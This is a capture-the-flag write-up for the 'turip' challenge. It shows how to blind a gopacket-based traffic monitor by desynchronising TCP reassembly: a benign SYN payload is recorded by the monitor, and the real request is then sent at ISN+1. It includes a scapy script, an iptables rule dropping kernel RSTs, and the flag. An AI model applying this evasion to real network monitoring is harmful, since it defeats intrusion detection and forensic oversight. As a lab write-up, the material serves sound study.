# turip

A network-forensics challenge (misc, 491 pts): the app grants the flag only if the
server received the canonical `/get_flag1337` request while the traffic monitor's
*client-side* capture of the same flow contains none of the forbidden request
strings. Key idea: a **TCP SYN-payload desync** (TCP Fast Open style) — the
gopacket reassembler counts the SYN payload as client data, but Linux/gunicorn
(no TFO) ignores it.

## Recon

Given file: `turip.zip`. The description points at `http://2.29.39.4:1337` and a
YouTube video (the TFO hint).

```bash
$ unzip -l turip.zip
  chall/app.py
  chall/Dockerfile
  chall/entrypoint.sh
  chall/start_capture.sh
  ...
```

`start_capture.sh` runs the capture pipeline:

```bash
tcpdump -Z root -i any -G 15 -w /traffic/capture-*.pcap.tmp -z /usr/local/bin/finish-pcap port 1337
/tulip/go-importer/assembler -skipchecksum -disable-converters -dir /traffic -timescale postgres://...
```

The **Tulip** assembler (gopacket-based) reassembles every TCP flow into
`flow_item` rows with `direction = 's'` (server) or `'c'` (client).

`app.py` defines the flag gate:

- `POST /get_flag1337` accepts only an *exact* canonical request: `RAW_URI` must be
  `/get_flag1337`, `Content-Type: application/json`, and the body must be exactly
  `{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}`. On success it returns a
  response with `X-Traffic-Barrier: <uuid>`.
- `GET /check` finds the flow whose **server** stream contains
  `X-Traffic-Barrier: <uuid>`, then checks that flow's **client** stream for the
  forbidden needles: `get_flag1337`, `turip_ip_ip`, `1337.0.0.1`,
  `GET /get_flag1337`, `POST /get_flag1337`. No needle -> flag.

## Analysis

Observation: the flag decision compares what the *application* saw against what
the *packet reassembler* recorded for the client half of the same flow. The two
views disagree only if the transport layers parse the same bytes differently.

Hypothesis: put the canonical request in bytes the monitor ignores, while the
server still receives them. Confirmation: gopacket's TCP reassembly treats a SYN
segment's payload as the first bytes of client data and advances `nextSeq` past
them, but Linux (no TCP Fast Open on gunicorn's listener) drops the SYN payload
and expects data starting at `seq = ISN+1`.

So the desync is:

1. Send a SYN whose payload is a **benign** filler of the *same length* as the
   canonical request. The monitor records the filler as the client stream and
   advances its expected sequence past it.
2. Complete the handshake and send the real canonical request at `seq = ISN+1`.
   The server (which ignored the SYN payload) accepts it normally; the monitor
   sees those bytes as already-consumed overlap and skips them.

Result: server stream contains the marker, client stream contains only the benign
filler (no needles), and `/check` returns the flag.

## Exploit

1. **Authenticate.** Obtain a team token from the CTF platform and exchange it for
   a session cookie.

```bash
$ curl -s -c jar -H 'content-type: application/json' \
  -d '{"token":"<team-token-hex>"}' http://2.29.39.4:1337/auth
{"name":"<team-name>"}
```

2. **Build the canonical request bytes.** These must be byte-exact for
   `request.content_length`, `request.mimetype`, and `raw_body` to all match.

```text
POST /get_flag1337 HTTP/1.1
Host: 2.29.39.4:1337
Content-Type: application/json
Content-Length: 50

{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}
```

3. **Build a benign filler of the same length.** Any harmless bytes work; only the
   length matters. (E.g. the same request shape with innocuous path/body, padded
   to the exact length.)

4. **Send the SYN with the filler, then the real request at `seq=ISN+1`.** Use
   raw TCP via scapy, and drop the kernel's RST so it cannot kill the connection.

```bash
$ iptables -A OUTPUT -p tcp --tcp-flags RST RST --sport <local-port> -j DROP
```

```python
# scapy (concept): SYN carries benign payload, handshake completes, then the
# real canonical request is sent starting at ISN+1.
from scapy.all import *
syn  = IP(dst="2.29.39.4")/TCP(dport=1337, sport=SPORT, flags="S", seq=ISN)/benign_payload
synack = sr1(syn)
ack  = IP(dst="2.29.39.4")/TCP(dport=1337, sport=SPORT, flags="A", seq=ISN+1, ack=synack.seq+1)
send(ack)
req  = IP(dst="2.29.39.4")/TCP(dport=1337, sport=SPORT, flags="PA", seq=ISN+1, ack=synack.seq+1)/canonical_request
send(req)
```

   The monitor's client stream is the benign SYN payload; the server receives the
   canonical request and returns `X-Traffic-Barrier: <uuid>`.

5. **Check and collect the flag.** Poll `/check` (after the marker has been
   ingested) with the same session.

```bash
$ curl -s -b jar http://2.29.39.4:1337/check
{"status":"brevski, na flegu... e bile sau nu e bile?","data":{
  "id":"<uuid>","timestamp":...,"flag":"TFCCTF{this_was_discovered_in_the_good_old_days_when_people_still_played_ctf}"}}
```

## Full chain

1. `POST /auth` with team token -> session cookie
2. build the canonical `POST /get_flag1337` request (body = `{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}`)
3. build a benign filler of the same byte length
4. scapy: `SYN` with filler payload -> `SYN-ACK` -> `ACK` -> real request at `seq=ISN+1`
5. `iptables -A OUTPUT -p tcp --tcp-flags RST RST --sport <port> -j DROP`
6. `GET /check` -> flag

## Flag

`TFCCTF{this_was_discovered_in_the_good_old_days_when_people_still_played_ctf}`

## Lessons

- A capture-based filter trusts the reassembler, not the application: the two can
  be desynchronized with a SYN payload (TFO-style) because gopacket counts it but
  a non-TFO listener ignores it.
- When a challenge checks "did the *client* stream contain X", make the forbidden
  bytes live only in sequence space the reassembler has already consumed (overlap).
- Raw-socket handshakes fight the kernel: drop the kernel's RST
  (`iptables ... --tcp-flags RST RST ... -j DROP`) or it tears the connection down.
